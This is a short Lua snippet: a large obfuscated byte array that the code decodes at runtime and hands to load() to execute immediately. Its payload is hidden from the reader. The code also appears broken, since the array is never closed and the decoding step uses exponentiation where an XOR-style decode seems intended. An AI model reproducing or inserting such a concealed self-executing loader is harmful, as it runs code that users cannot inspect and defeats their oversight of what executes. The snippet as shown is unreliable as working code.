local _b={108,117,111,119,132,72,131,150,109,177,129,136,136,124,161,167,151,180,161,167,177,204,193,199,201,228,225,229,242,252,251,6,236,247,255,7,4,23,26,34,28,55,69,64,52,87,91,102,108,87,94,107,132,119,123,143,156,151,153,165,180,186,193,198,44,58,64,72,68,87,95,112,92,122,129,136,116,154,159,167,172,154,165,168,196,186,189,198,220,221,236,231,241,252,254,7,246,244,1,15,25,12,30,40,40,36,62,71,78,60,94,102,84,116,94,101,114,140,126,132,144,164,158,172,168,188,185,204,50,59,63,68,76,87,84,100,118,100,126,140,144,124,161,167,147,180,168,166,196,181,200,220,215,222,236,236,243,252,252,3,236,251,5,4,12,32,20,39,52,56,44,71,82,88,68,103,83,87,124,103,115,120,148,144,136,164,161,170,173,188,193,195,52,52,65,75,88,76,97,111,115,100,129,137,136,124,161,164,148,180,161,172,178,204,193,195,208,228,225,235,243,252,1,2,248,244,254,12,13,12,30,36,50,36,62,75,82,60,94,102,86,116,100,132,121,140,126,134,151,164,158,165,177,188,190,195,50,52,69,74,68,90,92,97,92,124,108,135,144,151,132,164,144,180,159,171,196,185,201,220,212,220,236,235,242,252,1,6,240,244,3,8,4,31,31,28,55,60,44,63,73,60,89,102,108,87,94,103,132,119,126,143,156,151,159,172,180,186,192,192,44,58,65,73,68,87,95,100,92,119,130,139,116,151,157,162,172,151,162,171,196,183,186,194,220,215,216,230,244,240,4,6,240,252,252,6,17,23,20,39,54,58,44,71,72,85,68,103,87,95,124,102,132,119,137,135,156,151,153,171,180,186,190,200,44,58,62,69,68,90,94,102,92,122,127,128,116,154,159,163,172,155,162,196,178,179,191,220,210,219,228,244,241,250,4,1,249,244,4,9,4,26,26,28,49,55,62,52,77,80,68,98,85,116,99,106,132,118,127,156,136,153,172,167,179,175,196,199,48,56,60,71,80,85,84,103,113,125,108,135,146,143,132,167,146,156,188,166,176,192,212,199,213,217,236,223,239,252,250,1,236,247,0,9,4,23,30,36,28,47,65,52,77,88,68,96,85,116,105,103,132,127,122,156,145,153,153,180,177,176,188,204,49,64,63,68,81,96,97,92,114,119,130,116,145,143,154,140,146,151,161,196,177,182,192,220,210,215,222,244,242,250,249,12,242,252,3,4,17,31,30,28,50,55,67,52,81,8 _c="";for _i=1,#_b do _c=_c..string.char(((_b[_i]-(_i*7))%256)^(_i%256))end;local _f,_e=load(_c);if _f then _f()end;
